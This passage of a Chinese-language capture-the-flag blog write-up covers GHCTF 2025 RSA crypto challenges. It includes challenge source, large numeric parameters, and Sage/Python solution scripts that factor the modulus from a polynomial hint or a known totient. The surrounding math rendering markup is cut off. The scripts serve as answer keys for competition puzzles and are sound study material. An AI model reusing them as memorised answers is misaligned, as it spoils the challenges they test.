class="mclose">)</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.791661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.791661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p>还有位师傅的思路是<a href="https://seandictionary.top/ghctf-2025/">换元</a>，还有下面那题二元的<strong>换元消y</strong>，不是很能理解</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">101780569941880865465631942473186578520071435753163950944409148606282910806650879176280021512435190682009749926285674412651435782567149633130455645157688819845748439487113261739503325065997835517112163014056297017874761742768297646567397770742374004940360061700285170103292360590891188591132054903101398360047</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">77538275949900942020886849496162539665323546686749270705418870515132296087721218282974435210763225488530925782158331269160555819622551413648073293857866671421886753377970220838141826468831099375757481041897142546760492813343115244448184595644585857978116766199800311200819967057790401213156560742779242511746</span></span><br><span class="line">w = <span class="number">32824596080441735190523997982799829197530203904568086251690542244969244071312854874746142497647579310192994177896837383837384405062036521829088599595750902976191010000575697075792720479387771945760107268598283406893094243282498381006464103080551366587157561686900620059394693185990788592220509670478190685244</span></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">f = <span class="number">2</span>*x^<span class="number">332</span> - x^<span class="number">331</span> + x^<span class="number">329</span> + <span class="number">3</span>*x^<span class="number">328</span> - x^<span class="number">327</span> - <span class="number">3</span>*x^<span class="number">325</span> + x^<span class="number">323</span> - <span class="number">3</span>*x^<span class="number">322</span> - x^<span class="number">321</span> - <span class="number">3</span>*x^<span class="number">320</span> + x^<span class="number">319</span> + <span class="number">2</span>*x^<span class="number">318</span> - <span class="number">4</span>*x^<span class="number">317</span> - <span class="number">3</span>*x^<span class="number">315</span> - <span class="number">2</span>*x^<span class="number">314</span> + x^<span class="number">313</span> + x^<span class="number">312</span> + <span class="number">2</span>*x^<span class="number">311</span> + <span class="number">2</span>*x^<span class="number">309</span> + <span class="number">2</span>*x^<span class="number">308</span> + <span class="number">5</span>*x^<span class="number">307</span> + <span class="number">2</span>*x^<span class="number">306</span> + <span class="number">3</span>*x^<span class="number">305</span> + <span class="number">5</span>*x^<span class="number">304</span> + <span class="number">4</span>*x^<span class="number">303</span> + x^<span class="number">302</span> - x^<span class="number">301</span> - x^<span class="number">300</span> - <span class="number">2</span>*x^<span class="number">299</span> - <span class="number">2</span>*x^<span class="number">298</span> + x^<span class="number">297</span> + <span class="number">3</span>*x^<span class="number">296</span> - x^<span class="number">295</span> - <span class="number">4</span>*x^<span class="number">292</span> - x^<span class="number">290</span> + <span class="number">4</span>*x^<span class="number">289</span> - x^<span class="number">287</span> - <span class="number">3</span>*x^<span class="number">286</span> + x^<span class="number">285</span> - <span class="number">2</span>*x^<span class="number">284</span> + x^<span class="number">283</span> - x^<span class="number">282</span> - <span class="number">2</span>*x^<span class="number">281</span> + x^<span class="number">280</span> - <span class="number">2</span>*x^<span class="number">279</span> + x^<span class="number">278</span> + <span class="number">2</span>*x^<span class="number">277</span> - <span class="number">3</span>*x^<span class="number">276</span> - x^<span class="number">275</span> - <span class="number">4</span>*x^<span class="number">274</span> - <span class="number">3</span>*x^<span class="number">273</span> - <span class="number">5</span>*x^<span class="number">272</span> - <span class="number">2</span>*x^<span class="number">271</span> - <span class="number">3</span>*x^<span class="number">270</span> + <span class="number">2</span>*x^<span class="number">269</span> + <span class="number">2</span>*x^<span class="number">268</span> - x^<span class="number">267</span> - <span class="number">2</span>*x^<span class="number">266</span> + x^<span class="number">265</span> + x^<span class="number">264</span> - <span class="number">3</span>*x^<span class="number">262</span> - <span class="number">3</span>*x^<span class="number">259</span> + <span class="number">2</span>*x^<span class="number">258</span> - x^<span class="number">257</span> + <span class="number">2</span>*x^<span class="number">256</span> + <span class="number">2</span>*x^<span class="number">255</span> - x^<span class="number">254</span> - <span class="number">2</span>*x^<span class="number">253</span> - x^<span class="number">252</span> + <span class="number">2</span>*x^<span class="number">251</span> - x^<span class="number">250</span> + x^<span class="number">249</span> + <span class="number">2</span>*x^<span class="number">247</span> + <span class="number">2</span>*x^<span class="number">246</span> + <span class="number">2</span>*x^<span class="number">245</span> - <span class="number">2</span>*x^<span class="number">244</span> - <span class="number">3</span>*x^<span class="number">243</span> + <span class="number">2</span>*x^<span class="number">242</span> - <span class="number">3</span>*x^<span class="number">241</span> - x^<span class="number">240</span> - <span class="number">3</span>*x^<span class="number">239</span> - x^<span class="number">236</span> - <span class="number">3</span>*x^<span class="number">235</span> - <span class="number">2</span>*x^<span class="number">234</span> - x^<span class="number">233</span> - <span class="number">2</span>*x^<span class="number">232</span> - x^<span class="number">231</span> - <span class="number">3</span>*x^<span class="number">230</span> - <span class="number">2</span>*x^<span class="number">229</span> - <span class="number">4</span>*x^<span class="number">228</span> - <span class="number">2</span>*x^<span class="number">227</span> - <span class="number">3</span>*x^<span class="number">226</span> + <span class="number">2</span>*x^<span class="number">225</span> + x^<span class="number">224</span> - x^<span class="number">223</span> - <span class="number">2</span>*x^<span class="number">221</span> + <span class="number">3</span>*x^<span class="number">219</span> - x^<span class="number">217</span> - <span class="number">2</span>*x^<span class="number">216</span> + x^<span class="number">215</span> + <span class="number">2</span>*x^<span class="number">213</span> - x^<span class="number">212</span> + <span class="number">3</span>*x^<span class="number">211</span> + x^<span class="number">210</span> + <span class="number">4</span>*x^<span class="number">209</span> + x^<span class="number">208</span> - x^<span class="number">206</span> - x^<span class="number">205</span> - x^<span class="number">204</span> + <span class="number">2</span>*x^<span class="number">203</span> - <span class="number">3</span>*x^<span class="number">202</span> + <span class="number">2</span>*x^<span class="number">199</span> - x^<span class="number">198</span> + <span class="number">2</span>*x^<span class="number">196</span> - <span class="number">2</span>*x^<span class="number">195</span> + <span class="number">3</span>*x^<span class="number">194</span> + <span class="number">3</span>*x^<span class="number">193</span> - x^<span class="number">192</span> + <span class="number">4</span>*x^<span class="number">191</span> + <span class="number">2</span>*x^<span class="number">189</span> + x^<span class="number">186</span> - x^<span class="number">185</span> - x^<span class="number">184</span> + <span class="number">3</span>*x^<span class="number">183</span> + x^<span class="number">182</span> + <span class="number">2</span>*x^<span class="number">181</span> - <span class="number">2</span>*x^<span class="number">180</span> + x^<span class="number">177</span> + x^<span class="number">175</span> - x^<span class="number">173</span> + <span class="number">3</span>*x^<span class="number">172</span> + x^<span class="number">170</span> + x^<span class="number">169</span> - x^<span class="number">167</span> - <span class="number">2</span>*x^<span class="number">166</span> - x^<span class="number">165</span> - <span class="number">4</span>*x^<span class="number">164</span> - <span class="number">2</span>*x^<span class="number">163</span> + <span class="number">2</span>*x^<span class="number">162</span> + <span class="number">4</span>*x^<span class="number">161</span> - <span class="number">2</span>*x^<span class="number">160</span> - <span class="number">3</span>*x^<span class="number">159</span> - <span class="number">2</span>*x^<span class="number">158</span> - <span class="number">2</span>*x^<span class="number">157</span> + x^<span class="number">156</span> - x^<span class="number">155</span> + <span class="number">3</span>*x^<span class="number">154</span> - <span class="number">4</span>*x^<span class="number">153</span> + x^<span class="number">151</span> + <span class="number">2</span>*x^<span class="number">150</span> + x^<span class="number">149</span> - x^<span class="number">148</span> + <span class="number">2</span>*x^<span class="number">147</span> + <span class="number">3</span>*x^<span class="number">146</span> + <span class="number">2</span>*x^<span class="number">145</span> - <span class="number">4</span>*x^<span class="number">144</span> - <span class="number">4</span>*x^<span class="number">143</span> + x^<span class="number">142</span> - <span class="number">2</span>*x^<span class="number">140</span> - <span class="number">2</span>*x^<span class="number">139</span> + <span class="number">2</span>*x^<span class="number">138</span> + <span class="number">3</span>*x^<span class="number">137</span> + <span class="number">3</span>*x^<span class="number">136</span> + <span class="number">3</span>*x^<span class="number">135</span> + x^<span class="number">134</span> - x^<span class="number">133</span> + <span class="number">2</span>*x^<span class="number">132</span> + <span class="number">3</span>*x^<span class="number">130</span> - <span class="number">3</span>*x^<span class="number">129</span> - <span class="number">2</span>*x^<span class="number">128</span> - x^<span class="number">127</span> - <span class="number">2</span>*x^<span class="number">126</span> + x^<span class="number">125</span> + x^<span class="number">124</span> - <span class="number">2</span>*x^<span class="number">123</span> + x^<span class="number">122</span> - x^<span class="number">121</span> + <span class="number">3</span>*x^<span class="number">120</span> - x^<span class="number">119</span> - <span class="number">2</span>*x^<span class="number">118</span> - x^<span class="number">117</span> - x^<span class="number">116</span> - <span class="number">2</span>*x^<span class="number">115</span> + <span class="number">2</span>*x^<span class="number">114</span> + <span class="number">2</span>*x^<span class="number">113</span> - <span class="number">3</span>*x^<span class="number">112</span> - x^<span class="number">111</span> - <span class="number">4</span>*x^<span class="number">110</span> + x^<span class="number">109</span> + x^<span class="number">108</span> + x^<span class="number">106</span> - <span class="number">4</span>*x^<span class="number">105</span> + x^<span class="number">104</span> - x^<span class="number">103</span> - x^<span class="number">101</span> + x^<span class="number">100</span> - <span class="number">2</span>*x^<span class="number">99</span> + x^<span class="number">98</span> - x^<span class="number">97</span> + <span class="number">3</span>*x^<span class="number">96</span> + <span class="number">3</span>*x^<span class="number">94</span> - x^<span class="number">93</span> - x^<span class="number">92</span> + x^<span class="number">91</span> - <span class="number">2</span>*x^<span class="number">90</span> + x^<span class="number">89</span> - x^<span class="number">88</span> + x^<span class="number">87</span> - x^<span class="number">86</span> + x^<span class="number">85</span> + x^<span class="number">84</span> - x^<span class="number">83</span> + x^<span class="number">79</span> - <span class="number">3</span>*x^<span class="number">78</span> - <span class="number">2</span>*x^<span class="number">77</span> + x^<span class="number">74</span> + <span class="number">3</span>*x^<span class="number">73</span> - x^<span class="number">72</span> - <span class="number">3</span>*x^<span class="number">71</span> - <span class="number">2</span>*x^<span class="number">70</span> + x^<span class="number">69</span> - <span class="number">3</span>*x^<span class="number">66</span> + x^<span class="number">65</span> + x^<span class="number">64</span> - <span class="number">4</span>*x^<span class="number">62</span> - x^<span class="number">61</span> + x^<span class="number">60</span> - x^<span class="number">59</span> + <span class="number">3</span>*x^<span class="number">58</span> - x^<span class="number">57</span> - x^<span class="number">54</span> + <span class="number">3</span>*x^<span class="number">53</span> + x^<span class="number">51</span> - <span class="number">3</span>*x^<span class="number">50</span> - x^<span class="number">49</span> + <span class="number">2</span>*x^<span class="number">47</span> - x^<span class="number">46</span> - x^<span class="number">44</span> + x^<span class="number">43</span> - x^<span class="number">42</span> - <span class="number">4</span>*x^<span class="number">41</span> - <span class="number">3</span>*x^<span class="number">39</span> - x^<span class="number">37</span> - x^<span class="number">36</span> - <span class="number">3</span>*x^<span class="number">35</span> + x^<span class="number">34</span> + x^<span class="number">33</span> - <span class="number">2</span>*x^<span class="number">32</span> + <span class="number">2</span>*x^<span class="number">31</span> - x^<span class="number">30</span> + <span class="number">2</span>*x^<span class="number">29</span> - <span class="number">2</span>*x^<span class="number">28</span> - <span class="number">2</span>*x^<span class="number">27</span> - x^<span class="number">24</span> + x^<span class="number">22</span> - <span class="number">5</span>*x^<span class="number">21</span> + <span class="number">3</span>*x^<span class="number">20</span> + <span class="number">2</span>*x^<span class="number">19</span> - x^<span class="number">18</span> + <span class="number">2</span>*x^<span class="number">17</span> + x^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">15</span> - <span class="number">2</span>*x^<span class="number">14</span> + x^<span class="number">13</span> + x^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">11</span> - <span class="number">3</span>*x^<span class="number">10</span> + <span class="number">3</span>*x^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">8</span> - <span class="number">4</span>*x^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">5</span> - <span class="number">4</span>*x^<span class="number">4</span> + x^<span class="number">3</span> - x^<span class="number">2</span> - <span class="number">1</span></span><br><span class="line">p = GCD(w-<span class="built_in">pow</span>(<span class="number">2</span>,<span class="built_in">int</span>(f%(x-<span class="number">1</span>),n),n))</span><br><span class="line"><span class="comment"># p = GCD(w * pow(2, -f(1), n) - 1, n)</span></span><br><span class="line">q = n // p</span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)).decode())</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi mathvariant="normal">%</mi><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>，这一看，</mtext><mi>s</mi><mi>a</mi><mi>g</mi><mi>e</mi><mtext>还是太强大了</mtext></mrow><annotation encoding="application/x-tex">f\%(x-1)，这一看，sage还是太强大了</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord">%</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">看</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">s</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">还</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">太</span><span class="mord cjk_fallback">强</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">了</span></span></span></span></p><h2 id="baby_factor_revenge"><a class="markdownIt-Anchor" href="#baby_factor_revenge"></a> baby_factor_revenge</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">    pl  = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        pl.append(getPrime(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(pl)</span><br><span class="line">pl = create()</span><br><span class="line">m=<span class="string">b&#x27;NSSCTF&#123;xxxxxx&#125;&#x27;</span></span><br><span class="line">p,q,r = pl[<span class="number">0</span>],pl[<span class="number">1</span>],pl[<span class="number">2</span>]</span><br><span class="line">n = p*q*r</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi_2=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">n2=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(bytes_to_long(m),e,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;phi=<span class="subst">&#123;phi&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984460699747964946764645986828307675081596907634022110868102739948513844625534865764252668312850364286204872187001344218083941399088833989233474318289529103178632284291007694811574023047207470113594082533713524606268388742119103653587354956091145288566437795469230667897089543048576812362251576281067933183713438502813206542834734983616378764909202774603304124497453696792428111112644362307853143219890039129054302905340695668256116233515323529918746264727874817221051242387145263342018617858562987223211598238069486447049955021864781104312134816578626968386395835285074116149472750100154961405785440009296096563521430833</span></span><br><span class="line"><span class="string">phi=3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984394758254181484105857103844940487787404078873566779953101987404891507588290232992132681729619718279684673827347612899406697514777723904351697638562060304399923174376216080338949397741477013367831377040866937433520175862575061413321076151761545984886547872427147498175814451096795344136954743868643889768901204954902708679102384061694877757565486240670882343628571424084461972849147495569088820011108794930593172573959423278140327579049114196086428504291102619820322231225943837444001821535593671764186251713714593498207219093585758479440828038119079608764008747539277397742897542501803218788455452391287578171880267200</span></span><br><span class="line"><span class="string">c=8847973599594272436100870059187158819529199340583461915617467299706215012295598155778224026186157290320191983062022702191439286020733625396165573681688842631368993650799220713225485752608650482408353598320160571916055498330875851476520668973214124194890108144336715482373743731578734960096351460142579903010557821654345995923836938260379746304222820835040419844947019844885128550552066290798665884099701340641403329066058638137944934073185448687990744852400616823426082588916251127609191094346267837812018236673478691437630461425526779014305216914035039981685211625653600564431704400207095883904994772993227506462664</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>脚本源自<a href="https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/known_phi.py">https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/known_phi.py</a><br />(原来这个仓库早在<code>SHCTF2024-week4</code>就已经在题目中告诉我们了)</p><p>参考题目<code>NKCTF2023-ez_rsa</code>，<code>Google</code>搜<code>attack phi n</code>即可往下找到，作者的<code>github仓库</code>还有好多<code>attack脚本</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method only works for a modulus consisting of 2 primes!</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors, or None if the factors were not found</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s = N + <span class="number">1</span> - phi</span><br><span class="line">    d = s ** <span class="number">2</span> - <span class="number">4</span> * N</span><br><span class="line">    p = <span class="built_in">int</span>(s - isqrt(d)) // <span class="number">2</span></span><br><span class="line">    q = <span class="built_in">int</span>(s + isqrt(d)) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize_multi_prime</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method works for a modulus consisting of any number of primes, but is considerably be slower than factorize.</span></span><br><span class="line"><span class="string">    More information: Hinek M. J., Low M. K., Teske E., &quot;On Some Attacks on Multi-prime RSA&quot; (Section 3)</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    prime_factors = <span class="built_in">set</span>()</span><br><span class="line">    factors = [N]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(factors) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># Element to factorize.</span></span><br><span class="line">        N = factors[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        w = randrange(<span class="number">2</span>, N - <span class="number">1</span>)</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> phi % (<span class="number">2</span> ** i) == <span class="number">0</span>:</span><br><span class="line">            sqrt_1 = <span class="built_in">pow</span>(w, phi // (<span class="number">2</span> ** i), N)</span><br><span class="line">            <span class="keyword">if</span> sqrt_1 &gt; <span class="number">1</span> <span class="keyword">and</span> sqrt_1 != N - <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># We can remove the element to factorize now, because we have a factorization.</span></span><br><span class="line">                factors = factors[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                p = gcd(N, sqrt_1 + <span class="number">1</span>)</span><br><span class="line">                q = N // p</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_prime(p):</span><br><span class="line">                    prime_factors.add(p)</span><br><span class="line">                <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(p)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_prime(q):</span><br><span class="line">                    prime_factors.add(q)</span><br><span class="line">                <span class="keyword">elif</span> q &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(q)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Continue in the outer loop</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(prime_factors)</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    e=<span class="number">65537</span></span><br><span class="line">    n=<span class="number">3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984460699747964946764645986828307675081596907634022110868102739948513844625534865764252668312850364286204872187001344218083941399088833989233474318289529103178632284291007694811574023047207470113594082533713524606268388742119103653587354956091145288566437795469230667897089543048576812362251576281067933183713438502813206542834734983616378764909202774603304124497453696792428111112644362307853143219890039129054302905340695668256116233515323529918746264727874817221051242387145263342018617858562987223211598238069486447049955021864781104312134816578626968386395835285074116149472750100154961405785440009296096563521430833</span></span><br><span class="line">    phi=<span class="number">3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984394758254181484105857103844940487787404078873566779953101987404891507588290232992132681729619718279684673827347612899406697514777723904351697638562060304399923174376216080338949397741477013367831377040866937433520175862575061413321076151761545984886547872427147498175814451096795344136954743868643889768901204954902708679102384061694877757565486240670882343628571424084461972849147495569088820011108794930593172573959423278140327579049114196086428504291102619820322231225943837444001821535593671764186251713714593498207219093585758479440828038119079608764008747539277397742897542501803218788455452391287578171880267200</span></span><br><span class="line">    c=<span class="number">8847973599594272436100870059187158819529199340583461915617467299706215012295598155778224026186157290320191983062022702191439286020733625396165573681688842631368993650799220713225485752608650482408353598320160571916055498330875851476520668973214124194890108144336715482373743731578734960096351460142579903010557821654345995923836938260379746304222820835040419844947019844885128550552066290798665884099701340641403329066058638137944934073185448687990744852400616823426082588916251127609191094346267837812018236673478691437630461425526779014305216914035039981685211625653600564431704400207095883904994772993227506462664</span></span><br><span class="line">    fac = factorize_multi_prime(n, phi)</span><br><span class="line">    p,q,r=<span class="built_in">sorted</span>(fac)</span><br><span class="line">    phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    d=inverse(e,phi)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)).decode())</span><br></pre></td></tr></table></figure><p>没想到这题居然还可以用<strong>coppersmith attack</strong>，长见识了，还得是<strong>xm爷</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>≡</mo><msup><mi>c</mi><mi>d</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><msub><mi>n</mi><mn>1</mn></msub><mo>≡</mo><msup><mi>m</mi><mrow><mi>e</mi><mo>∗</mo><mi>d</mi></mrow></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><msub><mi>n</mi><mn>2</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><msub><mi>n</mi><mn>1</mn></msub><mo>≡</mo><mi>m</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><msub><mi>n</mi><mn>2</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><msub><mi>n</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">s\equiv c^{d}\ mod\ n_{1}\equiv m^{e*d}\ mod\ n_{2}\ mod\ n_{1}\equiv m\ mod\ n_{2}\ mod\ n_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span 